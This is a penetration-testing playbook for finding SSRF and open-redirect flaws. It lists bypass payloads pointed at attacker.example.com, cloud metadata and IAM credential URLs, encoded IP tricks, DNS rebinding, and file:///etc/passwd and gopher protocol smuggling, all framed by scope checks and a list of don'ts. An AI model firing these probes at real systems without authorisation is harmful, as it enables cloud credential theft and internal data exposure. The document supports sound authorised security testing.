# Playbook: SSRF & Open Redirect

**Goal:** Identify endpoints that fetch user-supplied URLs (SSRF) or redirect to user-supplied destinations (open redirect).

**Active level:** Active. SSRF probes target benign external endpoints by default; only probe internal/metadata IPs after explicit user confirmation that target is in scope for that.

**Prerequisites:** Recon inventory; list of any input that looks like a URL.

## Steps

### 1. Identify URL-accepting inputs
From recon, list inputs that take URLs:
- Webhook configuration (`?webhook_url=`)
- Image/avatar URL upload-by-link
- URL preview / OpenGraph fetchers (e.g. paste URL in chat → app fetches preview)
- PDF/screenshot generators that accept URLs
- Import-from-URL features (CSV, OPML, calendar, JSON)
- "Continue to" / "redirect_uri" / "next" / "return_to" / "callback" / "url" params (these are usually redirect, not SSRF)
- OAuth `redirect_uri`
- Any field with placeholder text suggesting URL

For each, classify: **fetcher** (server makes the request) or **redirector** (browser is sent there).

### 2. Open redirect tests
For each redirector:

#### 2a. External redirect probe
1. Try setting the value to a fully-qualified external URL: `https://example.com/`
2. Submit / trigger the redirect.
3. Watch the navigation: does the browser end up at `https://example.com/`?
4. If yes → **Medium** open redirect (Critical if it's an OAuth `redirect_uri` because it enables token theft).

#### 2b. Bypass attempts (if naive blocking is in place)
If the app rejects external URLs, try:
- `https://target.com.attacker.example.com/` (subdomain trick)
- `https://target.com@attacker.example.com/` (userinfo trick)
- `//attacker.example.com/` (protocol-relative)
- `https:attacker.example.com` (no slashes)
- `\\attacker.example.com` (backslash trick — IE/old behavior)
- URL-encoded variants: `https%3A%2F%2Fattacker.example.com`
- Double-encode: `https%253A%252F%252Fattacker.example.com`
- Unicode/punycode: `https://аttacker.example.com` (Cyrillic 'а')

If any bypass works → **Medium** open redirect with bypass (note the bypass technique).

### 3. SSRF tests
For each fetcher:

#### 3a. External baseline
1. Set up (or use a public) callback URL you control. Options:
   - https://webhook.site (free, generates unique URL)
   - https://requestbin.com
   - Any HTTP endpoint you own
2. Trigger the fetch with that URL.
3. Confirm: does the callback receive a request? What headers does the target send?
   - User-Agent often identifies the fetcher library
   - May leak internal IPs in `X-Forwarded-For` or via response timing
   - Are credentials/cookies sent? (Should be no, but check.)
4. This confirms SSRF surface exists. Now test for restrictions.

#### 3b. Internal IP / metadata probes (REQUIRES EXTRA AUTH)
**Stop and re-confirm with user before this step.** Probing cloud metadata or internal ranges is more sensitive — confirm scope explicitly allows it.

If confirmed:
1. AWS metadata: `http://169.254.169.254/latest/meta-data/`
2. Specifically IAM creds (most impactful): `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
3. GCP: `http://metadata.google.internal/computeMetadata/v1/` (requires `Metadata-Flavor: Google` header — may not be settable via the fetcher)
4. Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01` (requires `Metadata: true` header)
5. Local: `http://127.0.0.1/`, `http://localhost/`, `http://127.0.0.1:6379/` (Redis), `http://127.0.0.1:9200/` (Elasticsearch), `http://127.0.0.1:5432/` (Postgres — won't work HTTP but probes presence)
6. Private ranges: `http://10.0.0.1/`, `http://192.168.1.1/`, `http://172.17.0.1/` (Docker default bridge)
7. IPv6 loopback: `http://[::1]/`

For each, observe response (full body, headers, error messages, timing).

#### 3c. Bypass attempts (if naive IP blocking)
If 169.254.169.254 is blocked, try:
- Decimal: `http://2852039166/` (= 169.254.169.254 as 32-bit int)
- Octal: `http://0251.0376.0251.0376/`
- Hex: `http://0xa9fea9fe/`
- Mixed: `http://0xa9.0xfe.0xa9.0xfe/`
- DNS rebinding services (e.g. https://chir.ag/projects/rebind/) — set up a domain that resolves to your callback first, then to 169.254.169.254 on second resolution
- IPv6 mapping: `http://[::ffff:169.254.169.254]/`
- `http://localhost.attacker.example.com/` if attacker-controlled DNS
- Redirect: send the fetcher to `https://your-server/redirect` which 302s to `http://169.254.169.254/`. If the fetcher follows redirects without re-validating → bypass.

#### 3d. Protocol smuggling
If the fetcher accepts non-HTTP schemes:
- `file:///etc/passwd` — local file read via SSRF
- `gopher://...` — historic technique to talk to other protocols (Redis, Memcache) through HTTP libs
- `dict://`, `ftp://`, `ldap://`
- If any read succeeds → **Critical**.

### 4. Blind SSRF detection
If the response body doesn't show fetched content (the server fetches but doesn't show you the result), still confirm via the callback service:
1. Trigger the fetch with your webhook URL.
2. Wait 30 seconds.
3. Check the callback for an inbound request.
4. If received → **High** (blind SSRF — limited but exploitable for internal recon).

### 5. SSRF impact assessment
Once SSRF is confirmed, document:
- Can it reach localhost? (most concerning)
- Can it reach cloud metadata? (Critical — enables IAM cred theft)
- Can it reach internal RFC1918 ranges? (High)
- Public-internet only? (Medium — still useful as oracle / DDoS amplifier)
- Does it follow redirects without re-validating? (often the bypass)
- Does it send cookies/auth headers to the fetched URL? (would leak target's secrets to attacker)

### 6. Server-Side Cache Poisoning (related)
If the SSRF target is something like a screenshot generator that caches by URL hash, try poisoning:
- Submit URL `https://attacker.example.com/?nonce=12345`
- Then submit the legitimate URL — could the cached attacker content be served?

(This is rare; only test if cache behavior is observed.)

## Severity baselines

| Finding | Severity |
|---------|----------|
| SSRF reaching cloud metadata + IAM creds extractable | **Critical** |
| SSRF reaching internal services (Redis/ES/DB) | **High** |
| SSRF reaching arbitrary internal IPs (recon only) | **High** |
| Blind SSRF (callback confirmed, no internal reach) | **Medium** |
| `file://` read via SSRF | **Critical** |
| OAuth redirect_uri unvalidated → token theft possible | **Critical** |
| Open redirect (login flow / general redirect) | **Medium** |
| Open redirect with bypass requiring obscure technique | **Low** to **Medium** |

## Don'ts
- **Don't probe cloud metadata or internal ranges without re-confirming scope.** Pulling IAM creds is real harm even in a test.
- **If you DO get IAM creds via SSRF, do not use them.** Document, report, stop.
- Don't open-redirect users to malicious sites — use a benign domain you control for the proof.
- Don't DDoS via SSRF amplification (sending many requests through the SSRF endpoint to a third party).
- Don't follow chained SSRF into other organizations' infrastructure.
